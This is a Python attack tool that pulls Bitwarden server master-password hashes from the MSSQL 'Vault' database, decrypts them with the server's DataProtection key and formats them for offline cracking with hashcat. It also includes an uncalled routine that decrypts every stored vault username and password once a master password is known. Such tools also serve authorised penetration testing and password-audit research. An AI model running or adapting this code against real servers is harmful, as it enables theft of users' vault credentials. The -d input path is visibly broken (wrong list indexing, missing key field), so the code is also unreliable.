#!/usr/bin/env python3
"""Utility to extract server-side Bitwarden master password hashes for hashcat"""

#
# Author: https://github.com/austin-ralls-cs
# License: MIT
#

import argparse
import base64
import sys
from struct import unpack

# There's a local copy in this repo but upstream is
# https://github.com/ivision-research/pydataprotection
from dataprotection import DataProtection


def process_sql(sql_conn):
    try:
        from impacket.examples.utils import parse_target
        from impacket import tds
    except ImportError:
        print(
            "Install impacket with `pip install impacket` or use -d instead.",
            file=sys.stderr,
        )
        exit(1)
    domain, username, password, remoteName = parse_target(sql_conn)

    ms_sql = tds.MSSQL(remoteName)
    ms_sql.connect()
    if not ms_sql.login("Vault", username, password, domain):
        print("Failed to log in to MSSQL DB", file=sys.stderr)
        exit(1)
    user_rows = ms_sql.RunSQLQuery(
        "Vault",
        'select "Id",Email,MasterPassword,KdfIterations,"Key" from "User"',
    )
    cipher_rows = ms_sql.RunSQLQuery("Vault", 'select UserId,"Data" from "Cipher";')
    ms_sql.disconnect()
    return user_rows, cipher_rows


def format_enc(user_row):
    if user_row["Key"][:2] != b"2.":
        print("error: unsupported key encryption type")
        return None
    iv, ct, mac = user_row["Key"][2:].split(b"|")
    return f"$bitwarden-server-key$1*{user_row['KdfIterations']}*{base64.b64encode(user_row['Email'].encode()).decode()}*{(iv + ct).decode()}*{mac.decode()}"


def dump_secrets(user, cipher_rows, password):
    import json
    import hmac
    import hashlib

    from cryptography.hazmat.primitives import hashes, padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.kdf.hkdf import HKDFExpand

    def parse_encrypted_field(field):
        # 2 means AesCbc256_HmacSha256_B64,  iv|ct|mac
        # https://github.com/bitwarden/server/blob/42f6112c552d75566ec8c5e1070b66c0b6578660/src/Core/Utilities/EncryptedStringAttribute.cs#L18C58-L18C68
        # https://github.com/bitwarden/server/blob/42f6112c552d75566ec8c5e1070b66c0b6578660/src/Core/Enums/EncryptionType.cs#L9C5-L9C29
        assert field[:2] == b"2."
        iv, ct, mac = field[2:].split(b"|")
        return {
            "iv": base64.b64decode(iv),
            "ct": base64.b64decode(ct),
            "mac": base64.b64decode(mac),
        }

    protected_symmetric_key_parts = parse_encrypted_field(user["Key"])

    master_key = hashlib.pbkdf2_hmac(
        "sha256", password, user["Email"].encode(), user["KdfIterations"]
    )
    # https://github.com/bitwarden/clients/blob/9eeaf0a61f534dc404cfc10704b80a018f0ef391/libs/common/src/auth/services/master-password/master-password.service.ts#L150
    stretched_master_key_mac = HKDFExpand(
        algorithm=hashes.SHA256(),
        length=32,
        info=b"mac",  # purpose
    ).derive(master_key)
    if (
        hmac.new(
            key=stretched_master_key_mac,
            msg=protected_symmetric_key_parts["iv"]
            + protected_symmetric_key_parts["ct"],
            digestmod="sha256",
        ).digest()
        != protected_symmetric_key_parts["mac"]
    ):
        print("bad password")
        exit(1)
    stretched_master_key_enc = HKDFExpand(
        algorithm=hashes.SHA256(),
        length=32,
        info=b"enc",  # purpose
    ).derive(master_key)
    cipher = Cipher(
        algorithms.AES(stretched_master_key_enc),
        modes.CBC(protected_symmetric_key_parts["iv"]),
    ).decryptor()
    unpadder = padding.PKCS7(128).unpadder()
    symmetric_key = (
        unpadder.update(
            cipher.update(protected_symmetric_key_parts["ct"]) + cipher.finalize()
        )
        + unpadder.finalize()
    )
    symmetric_key_enc = symmetric_key[:32]
    symmetric_key_mac = symmetric_key[32:]
    # print('recovered user symmetric key')

    secrets = [json.loads(row["Data"]) for row in cipher_rows]
    for s in secrets:
        print(s)
        for k in ("Username", "Password", "Name"):
            field_parts = parse_encrypted_field(s[k].encode())
            assert (
                hmac.new(
                    key=symmetric_key_mac,
                    msg=field_parts["iv"] + field_parts["ct"],
                    digestmod="sha256",
                ).digest()
                == field_parts["mac"]
            )
            cipher = Cipher(
                algorithms.AES(symmetric_key_enc), modes.CBC(field_parts["iv"])
            ).decryptor()
            unpadder = padding.PKCS7(128).unpadder()
            field_plaintext = (
                unpadder.update(cipher.update(field_parts["ct"]) + cipher.finalize())
                + unpadder.finalize()
            )
            print(k, field_plaintext)


def format_hash(user_row):
    email = user_row["Email"]
    masterpassword_column = user_row["MasterPassword"]
    kdfiterations = user_row["KdfIterations"]
    hash_type, prf_type, inner_iterations, salt_len = unpack(
        ">BIII", masterpassword_column[:13]
    )
    if hash_type != 1:
        print("error: unknown hash type", file=sys.stderr)
        exit(1)
    if prf_type != 1:
        print(f"warning: prf type {prf_type} is not supported", file=sys.stderr)
    salt = masterpassword_column[13 : 13 + salt_len]
    subkey = masterpassword_column[13 + salt_len :]
    if len(subkey) != 32:
        print("error: failed parsing masterpassword column hash", file=sys.stderr)
        exit(1)

    def b64(d):
        return base64.b64encode(d).decode()

    return f"$bitwarden-server${prf_type}*{inner_iterations}*{kdfiterations}*{b64(email.encode())}*{b64(salt)}*{b64(subkey)}"


def main():
    parser = argparse.ArgumentParser(
        description="Extract and format masterpassword hash from Bitwarden server.",
        epilog="""You need to supply two parts:
    1. The encrypted data from the database. This can be pulled from a live database (-s) or you can pass a single value with metadata (-d)
    2. Key material. This can be extracted from an XML file (-x) or you can pass the key and metadata values (-k)""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    key_group = parser.add_mutually_exclusive_group(required=True)
    db_group = parser.add_mutually_exclusive_group(required=True)
    key_group.add_argument(
        "-x", dest="xml_path", type=argparse.FileType("r"), help="path to key XML file"
    )
    key_group.add_argument(
        "-k",
        dest="key_info",
        help="key information from XML file, in the form keyid_guid;enc_algorithm;validation_algorithm;key_base64",
    )
    db_group.add_argument(
        "-s",
        dest="sql_conn",
        help="MSSQL connection string, in the form username:password@host",
    )
    db_group.add_argument(
        "-d",
        dest="db_fields",
        help="fields from the database, in the format email;masterpassword;kdfiterations",
    )
    parser.add_argument(
        "-e",
        dest="alt_mode",
        action="store_true",
        help="switch to alternative method that outputs a hash line using encrypted fields instead of the authentication hash (not implemented in hashcat plugin)",
    )

    args = parser.parse_args()
    if args.alt_mode and args.db_fields:
        print("error: cannot use -d and -e together", file=sys.stderr)
        exit(1)

    dp = DataProtection("Bitwarden")
    if args.xml_path:
        dp.import_key(args.xml_path)
    elif args.key_info:
        key_id, enc_algorithm, validation_algorithm, masterkey = args.key_info.split(
            ";"
        )
        dp.set_key(
            base64.b64decode(masterkey),
            enc_algorithm,
            validation_algorithm,
            key_id,
        )

    if args.sql_conn:
        # cipher_rows is only used for dump_secrets, which is never referenced
        user_rows, cipher_rows = process_sql(args.sql_conn)
    else:
        db_entries = (args.db_fields.split(";"),)
        if len(db_entries[0]) != 3:
            print("Failed to parse entries from -d argument", file=sys.stderr)
            exit(1)
        user_rows = [
            {
                "Email": db_entries[0],
                "MasterPassword": db_entries[1],
                "KdfIterations": db_entries[2],
            },
        ]

    for row in user_rows:
        row["MasterPassword"] = base64.b64decode(
            dp.unprotect(
                base64.b64decode(
                    row["MasterPassword"][2:],
                    altchars="-_",
                ),
                "DatabaseFieldProtection",
            )
        )
        row["Key"] = dp.unprotect(
            base64.b64decode(
                row["Key"][2:],
                altchars="-_",
            ),
            "DatabaseFieldProtection",
        )
        if args.alt_mode:
            print(format_enc(row))
        else:
            print(format_hash(row))


if __name__ == "__main__":
    main()
